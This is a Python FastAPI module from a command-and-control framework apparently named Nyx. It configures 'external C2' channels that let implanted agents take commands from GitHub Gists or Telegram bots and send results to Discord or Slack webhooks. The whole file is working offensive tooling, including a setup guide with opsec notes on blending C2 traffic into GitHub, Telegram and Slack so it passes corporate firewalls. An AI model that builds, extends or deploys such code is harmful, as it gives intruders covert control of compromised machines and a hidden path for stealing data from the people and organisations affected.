"""
External C2 API — manage per-agent external channel configurations.

Supports: github-gist, telegram, discord-webhook, slack-webhook.
State is stored in-process (no DB — ext C2 config is ephemeral by design).
The operator issues channel config commands to agents via the normal task API.
"""

from __future__ import annotations

import uuid
from typing import Literal, Optional

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from db.database import get_db
from api.auth import get_current_user
from models.agent import Agent
from models.task import Task as TaskModel

router = APIRouter(prefix="/api/extc2", tags=["extc2"])

# ── In-memory channel registry ─────────────────────────────────────────────────

_channels: dict[str, dict] = {}   # id → channel_meta


class GistChannel(BaseModel):
    type: Literal["github"] = "github"
    agent_id: str
    gist_id: str
    gist_token: str
    poll_secs: int = Field(default=30, ge=5, le=3600)


class TelegramChannel(BaseModel):
    type: Literal["telegram"] = "telegram"
    agent_id: str
    bot_token: str
    chat_id: str
    poll_secs: int = Field(default=15, ge=5, le=3600)


class DiscordChannel(BaseModel):
    type: Literal["discord"] = "discord"
    agent_id: str
    webhook_url: str


class SlackChannel(BaseModel):
    type: Literal["slack"] = "slack"
    agent_id: str
    webhook_url: str


class ChannelConfig(BaseModel):
    """Discriminated union via `type` field."""
    type: str
    agent_id: str
    # github
    gist_id: Optional[str] = None
    gist_token: Optional[str] = None
    poll_secs: Optional[int] = 30
    # telegram
    bot_token: Optional[str] = None
    chat_id: Optional[str] = None
    # discord / slack
    webhook_url: Optional[str] = None


# ── Endpoints ──────────────────────────────────────────────────────────────────

@router.get("/")
def list_channels(_: str = Depends(get_current_user)):
    return list(_channels.values())


@router.post("/", status_code=201)
def configure_channel(cfg: ChannelConfig, db: Session = Depends(get_db), _: str = Depends(get_current_user)):
    """
    Store channel config + queue the appropriate extc2-* command to the agent.
    Returns the channel id and the command that was dispatched.
    """
    agent = db.query(Agent).filter(Agent.id == cfg.agent_id).first()
    if not agent:
        raise HTTPException(404, "Agent not found")

    # Build the nyx command
    command = _build_command(cfg)
    if not command:
        raise HTTPException(400, f"Unsupported type or missing fields for {cfg.type!r}")

    # Dispatch via task
    task = TaskModel(
        id=str(uuid.uuid4()),
        agent_id=cfg.agent_id,
        command=command,
        status="pending",
    )
    db.add(task)
    db.commit()

    # Store metadata
    cid = str(uuid.uuid4())
    _channels[cid] = {
        "id": cid,
        "type": cfg.type,
        "agent_id": cfg.agent_id,
        "task_id": task.id,
        "poll_secs": cfg.poll_secs,
        "status": "configured",
    }

    return {"channel_id": cid, "task_id": task.id, "command": command}


@router.delete("/{channel_id}")
def remove_channel(channel_id: str, db: Session = Depends(get_db), _: str = Depends(get_current_user)):
    ch = _channels.pop(channel_id, None)
    if not ch:
        raise HTTPException(404, "Channel not found")

    # Send stop command to agent
    task = TaskModel(
        id=str(uuid.uuid4()),
        agent_id=ch["agent_id"],
        command="extc2-stop",
        status="pending",
    )
    db.add(task)
    db.commit()
    return {"stopped": True, "task_id": task.id}


@router.get("/guide")
def setup_guide():
    """Returns per-channel setup instructions."""
    return {
        "github": {
            "title": "GitHub Gist C2",
            "steps": [
                "Create a **private** GitHub Gist at https://gist.github.com",
                "Add a file named `nyx_cmd.json` with content `{}`",
                "Generate a Personal Access Token with **gist** scope",
                "Configure: POST /api/extc2 with type=github, gist_id, gist_token",
                "Push commands by updating `nyx_cmd.json`: `{\"id\":\"<uuid>\",\"cmd\":\"<command>\",\"consumed\":false}`",
                "Results appear in `nyx_result.json` in the same gist",
            ],
            "opsec": "Traffic blends with normal github.com HTTPS. Gist content is private. IP exposed to GitHub.",
        },
        "telegram": {
            "title": "Telegram Bot C2",
            "steps": [
                "Create a bot via @BotFather: `/newbot`",
                "Get your bot token (format: `<id>:<hash>`)",
                "Send a message to the bot and get the chat_id via getUpdates",
                "Configure: POST /api/extc2 with type=telegram, bot_token, chat_id",
                "Send commands as plain text messages to the bot",
                "Results will be sent back as bot messages",
            ],
            "opsec": "Traffic goes to api.telegram.org. Fully encrypted. Bot token is the only credential.",
        },
        "discord": {
            "title": "Discord Webhook Mirror",
            "steps": [
                "In your Discord server, go to Channel Settings → Integrations → Webhooks",
                "Create a new webhook and copy the URL",
                "Configure: POST /api/extc2 with type=discord, webhook_url",
                "Task results will be mirrored to the Discord channel",
                "Note: this is results-only; send commands via the Nyx console",
            ],
            "opsec": "Outbound only. discord.com is commonly allowed in corporate firewalls.",
        },
        "slack": {
            "title": "Slack Incoming Webhook Mirror",
            "steps": [
                "Go to https://api.slack.com/apps → Create New App → Incoming Webhooks",
                "Activate Incoming Webhooks, add to workspace, copy Webhook URL",
                "Configure: POST /api/extc2 with type=slack, webhook_url",
                "Task results will be mirrored to the Slack channel",
                "Note: this is results-only; send commands via the Nyx console",
            ],
            "opsec": "Outbound only. slack.com traffic is universally allowed.",
        },
    }


# ── Helpers ────────────────────────────────────────────────────────────────────

def _build_command(cfg: ChannelConfig) -> str:
    if cfg.type == "github":
        if not cfg.gist_id or not cfg.gist_token:
            return ""
        return f"extc2-github {cfg.gist_id} {cfg.gist_token} {cfg.poll_secs or 30}"
    elif cfg.type == "telegram":
        if not cfg.bot_token or not cfg.chat_id:
            return ""
        return f"extc2-telegram {cfg.bot_token} {cfg.chat_id} {cfg.poll_secs or 15}"
    elif cfg.type == "discord":
        if not cfg.webhook_url:
            return ""
        return f"extc2-discord {cfg.webhook_url}"
    elif cfg.type == "slack":
        if not cfg.webhook_url:
            return ""
        return f"extc2-slack {cfg.webhook_url}"
    return ""
